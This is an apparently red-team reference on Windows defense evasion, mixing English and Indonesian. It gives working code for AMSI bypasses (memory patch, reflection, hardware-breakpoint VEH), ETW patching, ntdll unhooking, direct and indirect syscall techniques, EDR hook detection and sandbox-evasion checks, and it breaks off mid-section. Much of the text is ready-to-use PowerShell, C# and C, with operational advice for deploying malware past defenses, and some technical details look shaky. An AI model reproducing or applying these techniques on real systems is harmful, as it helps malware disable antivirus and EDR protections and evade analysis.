# evasion-windows — win

# Windows Defense Evasion — Red Team Reference

## 1. AMSI Bypass

### 1.1 Mechanism background
`amsi.dll` is loaded into the process (PowerShell, wscript, cscript, .NET, VBScript host). Key functions:
- `AmsiScanBuffer(LPVOID buffer, ULONG length, LPCSTR contentName, LPCSTR session, UINT32* result)` — located at `amsi.dll!AmsiScanBuffer+0x...`
- `AmsiScanString`
- `AmsiInitialize` fills the context pointer stored by the host.

The host calls `AmsiScanBuffer` before script/ScriptBlock execution. Returns `AMSI_RESULT_DETECTED = 32768`. If it returns `AMSI_RESULT_CLEAN = 0` or `S_OK = 0` without setting result, the host considers it clean.

Patching bisa menargetkan:
- Isi fungsi `AmsiScanBuffer` (patch bytes → `return AMSI_RESULT_CLEAN`).
- `amsiContext` / `amsiSession` fields in `System.Management.Automation` (nulled → AMSI skip).
- `AmsiScanBuffer` IAT in the host (redirect to stub).

### 1.2 Memory patch — `AmsiScanBuffer` → `E_INVALIDARG`

Classic signature (x64, see amsi.dll version; byte sequence varies between builds):
```
B8 57 00 07 80 C3   ; mov eax, 0x80070057 ; ret
```
6-byte patch at the start of `AmsiScanBuffer`. The host receives `0x80070057` (E_INVALIDARG) and treats it as "AMSI failed" → execution continues without scanning on PowerShell 5.1 (some 7.x versions are stricter).

PowerShell host:
```powershell
$am = [Ref].Assembly.GetTypes() | ? {$_.Name -like "*AmsiUtils*"}
$f  = $am.GetField("amsiInitFailed","NonPublic,Static")
$f.SetValue($null, $true)   # legacy path - blocked di build modern
```

Patch memory manual (C# inline, PowerShell 5.1 host):
```csharp
[DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string p);
[DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);

var h = LoadLibrary("amsi.dll");
var p = GetProcAddress(h, "AmsiScanBuffer");
uint old;
VirtualProtect(p, (UIntPtr)6, 0x40, out old);
byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
Marshal.Copy(patch, 0, p, 6);
```

**Artifacts:** `GetProcAddress("AmsiScanBuffer")` in userland, `VirtualProtect` with `PAGE_EXECUTE_READWRITE` on the `amsi.dll` region (image section `.text`). ETW-TI-based EDR (`Microsoft-Windows-Threat-Intelligence`) sees `VirtualProtect` targeting a private image if the page has already been committed RW; for shared images it remains visible through the kernel sensor.

**Why it fails:** amsi.dll build 2023+ moves part of the logic to `AmsiScanBuffer2` and adds an integrity check; PowerShell 7.4+ uses `AmsiUtils`, which checks module hash integrity before scanning. A 6-byte patch is not enough — a larger patch or redirect is needed.

### 1.3 Reflection — null-out `amsiContext`

The `amsiContext` field in `System.Management.Automation.AmsiUtils` (static) contains a pointer to the internal AMSI context. If null / invalid, `AmsiScanBuffer` returns `E_INVALIDARG` before scanning.

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
  GetField('amsiContext','NonPublic,Static').
  SetValue($null,[IntPtr]::Zero)
```
**Variables:** `amsiSession` and `amsiInitFailed` are secondary fields that are also nulled. PowerShell 5.1 build (Win11 24H2, PS 5.1.22621.4391) is still vulnerable; PowerShell 7.3.10 sets `amsiContext` to `SafeAmsiContextHandle` — `.SetValue` requires bypassing reflective field access (`BindingFlags` override) or `RuntimeHelpers.GetUninitializedObject`.

**Artifacts:** Reflection `GetType/GetField/SetValue` via `System.Management.Automation` in the `.NET Runtime` ETW profile provider `Microsoft-Windows-DotNETRuntime` (`MethodLoadVerbose`). EDR PowerShell script block logging (Event 4104) still logs ScriptBlock unless `ScriptBlockLogging` is disabled in the registry (requires admin).

### 1.4 Hardware breakpoint — `Dr0` + VEH

Without modifying memory. Set `Dr0 = &AmsiScanBuffer`, register `Dr7` with L0=1, RW0=0 (execute), LEN0=00. When the host calls `AmsiScanBuffer`, the CPU raises `EXCEPTION_SINGLE_STEP` (#DB, 0x80000004). The VEH handler checks `RIP == Dr0` → sets `RAX = 0x80070057`, `RIP += N` (skip prolog), `EXCEPTION_CONTINUE_EXECUTION`.

```c
// pseudo (C, ring3)
CONTEXT ctx; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
GetThreadContext(hThread, &ctx);
ctx.Dr0 = (DWORD64)pAmsiScanBuffer;
ctx.Dr7 = (ctx.Dr7 & ~0xF) | 0x1; // enable L0, exec
SetThreadContext(hThread, &ctx);

// VEH handler
LONG CALLBACK Veh(PEXCEPTION_POINTERS p) {
  if (p->ExceptionRecord->ExceptionCode == 0x80000004 &&
      p->ContextRecord->Rip == (DWORD64)pAmsiScanBuffer) {
    p->ContextRecord->Rax = 0x80070057;
    p->ContextRecord->Rip += <prolog_len>; // skip
    return EXCEPTION_CONTINUE_EXECUTION;
  }
  return EXCEPTION_CONTINUE_SEARCH;
}
```
Per-thread: if PowerShell uses a thread pool, breakpoint on the thread executing the script (usually the main thread + several workers). Alternative: attach to all threads via `Thread32First/Next`. The `.NET` runtime performs `SuspendThread` for GC — a thread suspended in the middle of `AmsiScanBuffer` will trigger #DB, which is fine if the handler is safe.

**Artifacts:** `GetThreadContext`/`SetThreadContext`/`AddVectoredExceptionHandler` — all userland, but `SetThreadContext` on `Dr0` is flagged by certain EDRs (Microsoft Defender "Tamper protection" 4.18+ `HWBP` heuristic). There is no memory write to the image.

**Why it fails:** There are only 4 debug registers (Dr0-D3). If the host or .NET runtime already uses HWBP (diagnostics, debugging), Dr0 conflicts. The handler must check `Dr6` for the `B0` flag and clear it. If not, repeated exceptions → hang.

### 1.5 AMSI bypass berbasis `AmsiScanString` + `AmsiInitialize` hook IAT

Hook `AmsiScanBuffer` in the host IAT (`System.Management.Automation.dll!AmsiScanBuffer` IAT entry) → detour to a stub that returns 0. Effective on hosts without an image-load callback. Defeated by EDR Import Table redirection detection.

| Technique | Target | EDR Artifact | Effective 2024-2025 |
|---|---|---|---|
| 6-byte memory patch | amsi.dll `.text` | VirtualProtect + WriteProcessMemory self | PS 5.1 yes; PS 7.4+ no |
| Reflection null | field .NET | Reflection telemetry | PS 5.1 build lama ya |
| HWBP + VEH | thread ctx | SetThreadContext | tergantung EDR |
| IAT hook | host IAT | IAT discrepancy | mostly no |

---

## 2. ETW Patching

### 2.1 Mekanisme
`EtwEventWrite` in `ntdll!EtwEventWrite` (userland) calls `NtTraceEvent` → `EtwpLogApiCalls` kernelless. Many providers important for red team:
- `Microsoft-Windows-DotNETRuntime` (assembly load, JIT, method invoke)
- `Microsoft-Windows-PowerShell` (script block, module logging)
- `Microsoft-Windows-Threat-Intelligence` (TI, admin/PPL only)
- `Microsoft-Windows-Kernel-Process` (process create, image load — via `EtwTi`)
- `Microsoft-Antimalware-Scan-Interface`

Patch `EtwEventWrite` → `ret 0` (x64: `C3` or `B8 00 00 00 00 C3`). All userland providers lose telemetry. Kernel ETW (process creation, image load via `EtwTi`) still runs — requires a separate patch or driver.

```c
// C
HMODULE h = GetModuleHandleA("ntdll.dll");
void* p = GetProcAddress(h, "EtwEventWrite");
DWORD old;
VirtualProtect(p, 1, PAGE_EXECUTE_READWRITE, &old);
*(BYTE*)p = 0xC3; // ret
VirtualProtect(p, 1, old, &old);
```

PowerShell inline (byte-patch via `Marshal`): same as AMSI, change the offset and shellcode `0xC3`.

**Artifacts:** `GetProcAddress("EtwEventWrite")`, `VirtualProtect` image `.text` (ntdll). Microsoft Defender for Endpoint sensor `Behavior:Win32/EtW.Bypass` (MDE 2023+) flags it if created from a non-Microsoft image — heuristic on `.text` diff post-load.

**Fails:** `EtwEventWriteFull` (RtlpTraceCritical) still calls the kernel-adjacent version of `EtwEventWrite`. Some telemetry (e.g. CIS `MpSvc` provider) uses `EtwEventWriteEx` → patch `EtwEventWriteEx` as well. Windows 11 24H2 build 26100 uses `NtTraceEvent` directly from the .NET 8 runtime for some providers — patching userland ETW alone does not disable it.

### 2.2 Patch `ntdll!EtwEventWrite` via `NtProtectVirtualMemory` (direct syscall)

Menghindari userland hook `VirtualProtect`:
```asm
; x64 direct syscall NtProtectVirtualMemory (SSN 0x50 pada Win11 22H2 22621.xxxx, cek per build)
mov r10, rcx
mov eax, 0x50
syscall
ret
```
After protection, write `C3`. The SSN changes per build (Windows 10 19045: `NtProtectVirtualMemory` = 0x50; Win11 22621 = 0x50; Win11 26100 = 0x50 — check with `SysWhispers` or a hook-detection scanner). Not stable across KB patches.

**Artifact:** direct syscall from a non-ntdll image → MDE syscall sensor (kernel callbacks `PsSetCreateProcessNotifyRoutineEx` do not cover it, but `Microsoft-Windows-Threat-Intelligence` records `NtProtectVirtualMemory` with a `CallStack` mismatch). The `Hell's Gate` calculator also leaves a `halosgate` string pattern in the binary.

---

## 3. Unhooking ntdll

### 3.1 Permasalahan
EDR userland hooks install a 5-byte detour `E9 xx xx xx xx` (jmp rel32) or `FF 25` (jmp qword) at the start of ntdll `Nt*`/`Zw*` functions. After unhooking, the direct syscall executes the original stub → correct SSN → kernel `Nt*` is called without a visible hook.

### 3.2 Fresh copy from KnownDlls / disk

The `KnownDlls` object directory `\KnownDlls\ntdll.dll` is a section mapped into every process. We open the section, map it to a new address, overwrite the hooked ntdll `.text`.

```c
// 1. buka \KnownDlls\ntdll.dll via NtOpenSection
UNICODE_STRING p; RtlInitUnicodeString(&p, L"\\KnownDlls\\ntdll.dll");
OBJECT_ATTRIBUTES oa = { .Length=sizeof(oa), .ObjectName=&p, .Attributes=OBJ_CASE_INSENSITIVE };
HANDLE h; NtOpenSection(&h, SECTION_MAP_READ, &oa);

// 2. map view
SIZE_T sz = 0; PVOID base = NULL;
NtMapViewOfSection(h, NtCurrentProcess(), &base, 0, 0, NULL, &sz, ViewShare, 0, PAGE_READONLY);

// 3. overwrite ntdll .text pada address space proses
// base = fresh ntdll image
// GetModuleHandle("ntdll") = current
PIMAGE_DOS_HEADER dos = ...;
PIMAGE_NT_HEADERS nt = ...;
PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);
for each section " .text ":
  memcpy(current_base + s->VirtualAddress, fresh_base + s->VirtualAddress, s->Misc.VirtualSize);
```

Fresh copy **does not touch** headers/relocations — only overwrites `.text`, so EDR that monitors image loads is not triggered (no new image). **Artifact:** `NtOpenSection` / `NtMapViewOfSection` on KnownDlls with a new base destination, cross-image memcpy.

**Disk variant:** read `C:\Windows\System32\ntdll.dll` → `CreateFile` + `ReadFile` + `memcpy` to `.text`. Artifact: ntdll.dll file read by a non-system process (high signal).

**Fails:** modern EDR (CrowdStrike Falcon 7.10+, MDE 2023+) performs periodic integrity checks on ntdll `.text` for hooked functions — a `.text` directory that differs from the original image = alert. Removing all hooks also removes EDR detection on that process itself, but the objective check after unhooking still runs. For EDR that does not check, unhooking is effective until reboot/process restart.

Fix: use a **per-function** fresh copy (only copy the first 16 bytes of the target function, e.g. `NtCreateThreadEx`, `NtOpenProcess`), so the global `.text` diff does not match.

### 3.3 Direct syscall (Hell's Gate)

Without ntdll. Get the SSN from ntdll as-is (if not hooked) or from the stub order:

```
; Hell's Gate, x64
; asumsi RCX = arg1, RDX = arg2, R8 = arg3, R9 = arg4
; ambil syscall number dari ntdll!Nt* (4 byte setelah prolog)
mov r10, rcx
mov eax, <SSN>
syscall
ret
```
Hell's Gate presisi SSN:
1. `GetProcAddress("NtCreateFile")` → pointer to the stub.
2. Cek `stub[0..3] == 4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`). Bila match, SSN = `*(DWORD*)(stub+4)`.
3. If not, use the Halo's Gate fallback.

**Artifact:** if all stubs are hooked, Hell's Gate fails (all ntdll hooks E9 → the first 5 bytes are not a prolog). Also, syscalls from non-ntdll addresses are flagged by the MDE sensor (kernel ETW-TI `CallStack` from a private image).

### 3.4 Halo's Gate — fallback when the stub is hooked

If `NtXxx` is hooked (`E9` or `FF 25`), find a neighboring `NtYyy` above/below that is not hooked, compute the relative SSN: `SSN(NtXxx) = SSN(NtYyy) ± distance`. The distance is determined by scanning the `syscall` pattern and the ordinal counter.

```
for (i = 1; i < 500; i++) {
  stub_up   = current_fn + i * STUB_SIZE;   // 32 byte
  stub_down = current_fn - i * STUB_SIZE;
  if (is_clean(stub_up))   return get_ssn(stub_up)   + i;
  if (is_clean(stub_down)) return get_ssn(stub_down) - i;
}
```

**Fragile:** STUB_SIZE depends on the compiler/build. Win10 19045 = 32 bytes, Win11 22621 = 32 bytes, Win11 26100 = 32 bytes — consistent, but the `E9` hook preamble replaces the bytes `4C 8B D1 B8` so `is_clean` can be a false positive if the hook is only 5 bytes. Halo's Gate finds a neighbor whose `E9` is also undetected. The resulting SSN can be wrong → BSOD or return `STATUS_INVALID_SYSTEM_SERVICE`.

### 3.5 Tartarus Gate / FreshyCalls / SysWhispers3

- **Tartarus Gate**: a Halo's Gate variant with `syscall; ret` validation as the stub terminator and `jmp [rip+...]` as the hook indicator. More tolerant of partial hooks.
- **FreshyCalls**: sort all `Nt*` stubs by address, SSN = index in address order (because ntdll arranges stubs by SSN). Does not need stub pattern matching. Vulnerable if a build changes the ordering.
- **SysWhispers3**: generator — `--jump` (jmp to a `syscall` gadget in ntdll, does not call `syscall` from a private image), `--egg` (encode the syscall number). Mitigates "syscall from private image" detection by `jmp` to a `syscall;ret` gadget in ntdll (`KiFastSystemCallRet` region or `Nt*` stub+offset).

```c
// SysWhispers3 --jump contoh
extern "C" NTSTATUS Sw3NtCreateFile(...) {
  // jmp ke ntdll!NtCreateFile+<offset syscall>
  return ((NTSTATUS(*)(...))pSyscallGadget)(...);
}
```

**Artifact:** `jmp` to an ntdll `.text` region that is not an entrypoint — if EDR performs return-address validation, `RIP` at `syscall` is in ntdll `.text` (looks normal), but the call stack before the `jmp` is from a private image. MDE 2024 added a "Syscall from private memory" heuristic that looks at the `RIP` region, not `RSP`.

### 3.6 Indirect syscall

Same as direct, but the `syscall` instruction is in ntdll (or `win32u.dll`), not in the attacker's image. Flow:
1. Set `rax = SSN`, `rcx = arg1`, dst.
2. `jmp` to the `syscall; ret` gadget in ntdll.
3. Return back to the caller.

Artifact: `rip` at `syscall` = inside ntdll. The kernel `PsGetCurrentProcess` + ETW-TI callstack parser sees an ntdll frame + private image caller. Does not disable detection, only reduces the naive "syscall instruction outside ntdll" heuristic.

### 3.7 Comparison table

| Technique | SSN source | syscall location | Main detection | Build stability |
|---|---|---|---|---|
| Hell's Gate | ntdll stub (clean) | private image | private syscall | high, fails if all stubs hooked |
| Halo's Gate | neighbor stub | private image | same + SSN mismatch | medium |
| Tartarus Gate | neighbor + `syscall` validation | private image | same | medium |
| FreshyCalls | address sort | private image | order mismatch | low across major builds |
| SysWhispers3 `--jump` | embedded | ntdll gadget | return-frame mismatch | tinggi |
| Direct syscall handmade | embedded | image private | image private syscall | tinggi |
| Indirect syscall | embedded + gadget ntdll | ntdll | return addr validation | tinggi |

**Windows 11 24H2 build numbers (26100.2314):** `NtCreateFile` SSN = 0x55, `NtProtectVirtualMemory` = 0x50, `NtAllocateVirtualMemory` = 0x18. Verify via `NtApiDotNet` or the `Syscall table` from `j00ru` for the specific build — do not hard-code across builds.

---

## 4. EDR Userland Hook Detection

To avoid hooks, first detect:

### 4.1 Check the first byte of each `Nt*`

```c
HMODULE h = GetModuleHandleA("ntdll.dll");
PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)h;
PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)h + dos->e_lfanew);
PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)h + nt->OptionalHeader.DataDirectory[0].VirtualAddress);
DWORD* names = (DWORD*)((BYTE*)h + exp->AddressOfNames);
for (DWORD i = 0; i < exp->NumberOfNames; i++) {
  char* name = (char*)h + names[i];
  if (name[0]!='N'||name[1]!='t') continue;
  void* fn = GetProcAddress(h, name);
  BYTE b = *(BYTE*)fn;
  if (b == 0xE9 || b == 0xFF) printf("HOOKED %s\n", name);
}
```
Standard EDR hooks: `E9 <rel32>` (Detours) or `FF 25 00 00 00 00` (jmp [rip+0]) or `48 FF 25` (jmp qword). The `mov rax, imm64; jmp rax` hook = `48 B8 ... FF E0` is also common.

### 4.2 Cek IAT host

For userland EDR hooks installed via the IAT (`Import Directory`), compare the address in the IAT with the original `GetProcAddress` + a fresh `LoadLibrary`. If different → hooked.

### 4.3 Cek `ntdll` diff via KnownDlls

Compare `.text` `.data` of a fresh ntdll vs the current ntdll. A non-zero diff in a function prolog = hook.

### 4.4 Cek `syscall` stub integrity

In hooked `NtXxx`, the `4C 8B D1 B8` prolog is missing. If a hook is detected and the SSN is taken from KnownDlls / disk, perform unhooking or a direct syscall.

**Concrete numbers:** CrowdStrike Falcon 7.16 hooks `NtCreateThreadEx`, `NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, `NtWriteVirtualMemory`, `NtOpenProcess`, `NtMapViewOfSection`. SentinelOne Singularity hooks ~160 functions. Microsoft Defender for Endpoint hooks ~40 functions in `ntdll` + `kernelbase.dll` + `kernel32.dll` + `amsi.dll`. Cortex XDR hooks via `.text` in `ntdll` only (~90 functions).

---

## 5. Sandbox Evasion

### 5.1 Sleep acceleration

Sandboxes usually accelerate `Sleep` to speed up sample execution. If the sample sleeps 10 minutes, the sandbox calls `NtDelayExecution` / `Sleep` with a reduced timeout (rapid returning).

Deteksi: ukur wall clock vs `QueryPerformanceCounter`.

```c
LARGE_INTEGER t1,t2,f;
QueryPerformanceFrequency(&f); QueryPerformanceCounter(&t1);
Sleep(60000); // 60 detik nominal
QueryPerformanceCounter(&t2);
double real = (double)(t2.QuadPart - t1.QuadPart) / f.QuadPart;
if (real < 55.0) { /* sandbox / accelerated sleep */ exit(0); }
```

**Why it fails:** some sandboxes (Cuckoo3, CAPE v2) now actually wait or use `NtDelayExecution` with a HighResolution timer that is not faked. Detection can also be a false positive on VMs with unstable TSC / host overload → `real > 70`. Use multiple samples + median. If the sandbox injects `Sleep` via a userland `Sleep` hook (ignoring the argument), `QueryPerformanceCounter` remains correct (kernel), so it is safe for detecting hook-based accelerators. If the sandbox uses a userland `NtDelayExecution` hook and does not alter QPC, detection remains accurate.

### 5.2 User interaction / mouse movement

```c
LASTINPUTINFO li = { sizeof(li) };
GetLastInputInfo(&li);
DWORD idle_ms = GetTickCount() - li.dwTime;
if (idle_ms < 30000) { /* ada interaksi → kemungkinan user nyata → perilaku normal */ }
else { /* idle → sandbox / analyst tidak di depan */ }
```
`GetLastInputInfo` returns `dwTime` for input in the desktop session where the process runs. A headless sandbox (Session 0) returns 0. A sandbox with an input simulator (CAPE `human.py`, Joe Sandbox simulated mouse) returns continuous interaction — it can be taken as a real user.

**Fails:** a Windows Service process (Session 0) receives no input, `GetLastInputInfo` 0 → often treated as a sandbox. The sample must distinguish Session 0 vs Session 1 vs 2: check `ProcessIdToSessionId` and `WTSQuerySessionInformation(WTSActive)`. Also `GetCursorPos` in a non-interactive session returns `(0,0)`.

### 5.3 Hardware fingerprint

Sandbox VMs have characteristic BIOS/OEM traits. Collect and compare:

```c
// WMI / registry
HKEY k; RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", ...);
RegQueryValueExA(..., "SystemManufacturer", ...);  // "VMware, Inc." / "QEMU" / "Xen" / "innotek GmbH" / "Microsoft Corporation" (Hyper-V)
RegQueryValueExA(..., "SystemProductName", ...);   // "VMware7,1" / "Standard PC" / "VirtualBox"

// CPU
SYSTEM_INFO si; GetSystemInfo(&si);
si.dwNumberOfProcessors; // sandbox umumnya 1-2, VM default 1
// RAM
GlobalMemoryStatusEx(&ms); ms.ullTotalPhys;
```

Ciri deteksi:
- CPU count < 2, RAM < 2 GB → sandbox default
- `SystemManufacturer` ∈ {VMware, QEMU, Xen, VirtualBox, innotek, Amazon EC2}
- `SystemProductName` ∈ {VirtualBox, VMware Virtual Platform, KVM, Standard PC}
- Disk size < 60 GB, single partition
- No battery (laptop) → `GetSystemPowerStatus` `BatteryFlag == 128` (no battery) + AC
- Username ∈ {sandbox, malware, analyst, user, John, test, vm, cuckoo, current}
- Hostname ∈ {SANDBOX, MALWARE, VIRUS, CUCKOO, JOE, ANALYSIS}
- MAC OUI ∈ VMware `00:0C:29`, `00:50:56`, `00:05:69`; VirtualBox `08:00:27`; QEMU `52:54:00`; Xen `00:16:3E`; Hyper-V `00:15:5D`
- Uptime < 15 menit (`GetTickCount64`)

A common detection pipeline: AND-based, i.e. requires ≥ 3 indicators to conclude sandbox — avoiding false positives on production VMs (many legitimate CI/VMs).

**Angka sandbox default 2024:**
| Platform | CPU | RAM | Disk | Hostname | Username | MAC |
|---|---|---|---|---|---|---|
| CAPEv2 | 1-2 | 2 GB | 40-60 GB | CAPE / cuckoo | cape / user | 52:54:00 / 08:00:27 |
| Joe Sandbox 38 | 2 | 4 GB | 80 GB | JOESANDBOX | joe | 00:50:56 |
| Any.run | 2 | 4 GB | 100 GB | (acak) | admin | 00:50:56 |
| Hybrid Analysis (CrowdStrike) | 2 | 4 GB | 100 GB | (acak) | analysis | 00:50:56 |

Modern platforms (Any.run paid tier, Hybrid Analysis) choose `< 2` indicators because of randomization — VM detection based on BIOS/registry alone fails. Use a combination: uptime, hardware, and **timing** (e.g. QPC in a hypervisor is inaccurate under TSC sync).

### 5.4 Nested / combined environment check (example)

```c
int score = 0;
if (cpu_count < 2) score++;
if (total_ram_gb < 4) score++;
if (battery == 128 && !has_ac) score++;
if (mac_oui_match(vm_oui_list)) score++;
if (idle_ms > 5*60*1000 && GetLastInputInfo_ok) score++;
if (uptime_ms < 15*60*1000) score++;
if (SystemManufacturer_contains("VMware|QEMU|Xen|VirtualBox|Microsoft")) score++;
if (username_in_list) score++;
if (hostname_in_list) score++;
if (score >= 3) sleep_long_or_exit();
```

---

## 6. Operational Pitfalls in the Field

1. **6-byte AMSI patch fails on PowerShell 7.4+ / Windows 11 24H2 build 26100** — `amsi.dll` verifies integrity and the host uses a new `AmsiUtils`. Test per build before deploying; switch to reflection field null or do not use PowerShell as a loader (move to .NET hosting `CLRCreateInstance` with `AmsiScanBuffer` IAT-redirect).

2. **A userland ETW patch does not disable kernel ETW-TI** — `Microsoft-Windows-Threat-Intelligence` (admin/PPL required) still sends syscall/THREATINTEL telemetry to the EDR. A userland patch only disables userland providers; for TI you need to disable `EtwTi` via the kernel `Etwp` (driver) or disable the provider via `EtwpControlTrace` (blocked in PPL).

3. **Global `.text` unhook = integrity alert on modern EDR** — Falcon/MDE/Cortex compare the initial image `.text` hash vs current. Do a **per-function copy** of only the first 16-32 bytes of the target function. Unhooking only `NtCreateThreadEx` leaves a small fingerprint.

4. **Wrong Halo's Gate SSN = BSOD 0x3B/0xC0000005** — depending on the build, STUB_SIZE can be 32 but the hook preamble is `E9` 5 bytes + NOP 27 bytes; `is_clean` false negative. Always validate that the neighboring stub has `4C 8B D1 B8` **and** `0F 05 C3` at the end (SysWhispers3 `--strict`). For new builds (26100+), canonicalizing the SSN from `KnownDlls` is more stable.

5. **Direct syscall from a private image = MDE "Syscall from private memory" detection** — use indirect syscall / SysWhispers3 `--jump` (the `syscall` gadget in ntdll) or unhook ntdll first and then call `Nt*` normally. Cost: performance and complexity.

6. **HWBP Dr0 on .NET thread pool** — PowerShell worker threads can change between executions; a breakpoint on the main thread does not cover a script running on a runspace thread. Set it on **all** threads (`Thread32First/Next` + `OpenThread` + `SetThreadContext`) or suspend first via `NtSuspendThread` before setting. Don't forget to clear `Dr6` in the handler.

7. **Sleep acceleration false positive on production VMs** — a VM with unstable TSC / host overload returns real time < nominal. Do not exit; combine with other indicators (score-based). A sandbox with an input simulator makes `GetLastInputInfo` useless (the analyst is not a "real user").

8. **`GetLastInputInfo` in Session 0 = 0** — a service process reports idle even when a user is in front. If the sample runs as a service, do not use idle as a sandbox indicator. Check `ProcessIdToSessionId` first.

9. **`amsiInitFailed` field is nulled in PowerShell 7** — `GetField` returns null on new builds; `$null` assignment silently fails. Check `$f -ne $null` before `SetValue`. Build 7.4+ replaces it with `SafeAmsiContextHandle` → requires reflection via `RuntimeHelpers.GetUninitializedObject` or `Unsafe`.

10. **AMSI patch in `System.Management.Automation.dll` versus host** — in PowerShell, `amsi.dll` is loaded lazily when the script is first scanned. `LoadLibrary("amsi.dll")` from script

## [continued]

# Advanced Reference: Windows Defense Evasion (Part 2)

## 7. AMSI Bypass — Advanced Variants & Edge Cases

### 7.1 AMSI Provider Enumeration & Selective Patch

Daripada patch universal `AmsiScanBuffer`, enumerasi provider memungkinkan patch selektif — menghindari crash jika signature AMSI berubah.

```c
// Enumerasi via registry: HKLM\SOFTWARE\Microsoft\AMSI\Providers
// Setiap CLSID -> InprocServer32 -> DLL. Load manual, resolve AmsiScanBuffer per-DLL.
// Keuntungan: patch hanya pada DLL aktif, tidak menyentuh amsi.dll principal (yang di-instrument AV).
```

**Pitfall**: `AmsiInitialize` stores an internal vtable pointer. Patching the `AmsiScanBuffer` export in `amsi.dll` is sometimes **ineffective** if the EDR loads a private copy (using `LoadLibraryEx` with `LOAD_LIBRARY_SEARCH_SYSTEM32` + hash verification). In this case, enumerating providers via the registry is more reliable.

### 7.2 Hardware Breakpoint AMSI (Dr0–Dr3) — Detail Thread Context

Technique: set `Dr0 = &AmsiScanBuffer`, `Dr7 = 0x1` (execute breakpoint), the handler in VEH (`AddVectoredExceptionHandler`) checks `ExceptionCode == EXCEPTION_SINGLE_STEP` and manipulates `Rip`.

```c
LONG CALLBACK AmsiVeh(PEXCEPTION_POINTERS pEx) {
    if (pEx->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // AmsiScanBuffer dipanggil — paksa return AMSI_RESULT_CLEAN (0)
        pEx->ContextRecord->Rax = 0;              // S_OK
        // Rdx = pointer ke AMSI_RESULT — set 0
        *(AMSI_RESULT*)pEx->ContextRecord->Rdx = AMSI_RESULT_CLEAN;
        // Simulasi ret: pop return address
        pEx->ContextRecord->Rip = *(DWORD64*)pEx->ContextRecord->Rsp;
        pEx->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// Pasang per-thread karena Dr register bersifat per-CPU per-thread:
CONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
GetThreadContext(hThread, &ctx);
ctx.Dr0 = (DWORD64)GetProcAddress(hAmsi, "AmsiScanBuffer");
ctx.Dr7 = (ctx.Dr7 & ~0x3) | 0x1;  // L0 = enable, RW0=00 (execute), LEN0=00 (byte)
SetThreadContext(hThread, &ctx);
```

**Edge case baru (2023–2024)**:
- **Windows 11 22H2+** with **Kernel-mode HWBP mitigation** (HVCI + KDP): `Dr7` writes from user mode still succeed, but the VEH handler can be preempted if the EDR installs **its own VEH first** (vector handler ordering). Solution: use `RtlAddVectoredExceptionHandler(1, ...)` (first) — the first argument = 1.
- **Per-thread vs per-process**: Dr is per-thread only. The `.NET` runtime thread pool needs to be enumerated via `NtGetNextThread` to set all worker threads before AMSI is called.
- **CET (Control-flow Enforcement Technology)** in Windows 11 24H2 validates returns without `CALL` — the "ret simulation" technique above can trigger a `#CP` fault if the shadow stack is active. **Workaround**: use `jmp` to the caller label or patch only `Rax/Rdx` and `EXCEPTION_CONTINUE_EXECUTION` without ret (native AmsiScanBuffer will still be executed — it must be skipped via `Rip` advance to `ret`).

### 7.3 Reflection Bypass — Varian PowerShell Terbaru

`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')` starts tripping signatures (AMSI signature `AmsiUtils` string). Advanced variants:

```powershell
# Obfuscation berbasis reflection tanpa string literal "AmsiUtils"
$t = [Ref].Assembly.GetTypes() | ? {$_.Name -match '^AmsiU\w+$'}
$f = $t.GetField('amsiInitFailed', 'NonPublic,Static')
$f.SetValue($null, $true)
```

**Edge case**:
- **PowerShell 7.x (.NET Core)**: the `AmsiUtils` type **does not exist** — AMSI is hosted by the `System.Management.Automation.dll` native shim (Windows only). Classic reflection fails. Alternative: patch `amsi.dll` in the `pwsh.exe` process memory via `VirtualProtect` (PowerShell 7 still calls `AmsiScanBuffer` from the native host).
- **Constrained Language Mode (CLM)**: blocks `[Ref].Assembly` — but `[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer` is also blocked, so the technique of patching native from pure PowerShell is impossible. Use `Add-Type` (also blocked) or injection from another process.
- **PowerShell 5.1 with AMSI "audit only"** (Windows Server 2019+ default in some SKUs): `AmsiScanBuffer` returns clean but still logs — the bypass "succeeds" in execution but is detected via telemetry. Check `HKLM\SOFTWARE\Microsoft\AMSI\Features\` for status.

### 7.4 AMSI for .NET — `Assembly.Load` Hook

AMSI scans assemblies twice: during `Assembly.Load(byte[])` (via `AmsiScanBuffer` with `contentName`) and during JIT. `Assembly.Load` is scanned by the **CLR internal** (`coreclr!AmsiScan` wrapper), not directly by `amsi.dll`.

Variant: patch the `AmsiScanAssembly` function in `clr.dll` / `coreclr.dll` (private symbol, resolve via PDB or signature scan). **Pitfall**: this patch is not portable across runtime versions — use the byte pattern `48 89 5C 24 ?? 55 56 57` (typical prolog) plus verification via `GetFileVersionInfo`.

## 8. ETW Patching — Varian & Edge Case

### 8.1 Modern `NtTraceEvent` Patch

`EtwEventWrite` is a thin wrapper; some EDRs hook `NtTraceEvent` (direct syscall). Patch both:

```c
// EtwEventWrite -> return 0
// NtTraceEvent -> return STATUS_SUCCESS (0)
// NtTraceControl -> return STATUS_SUCCESS (untuk disable logger)
```

**Edge case (Windows 11 24H2)**:
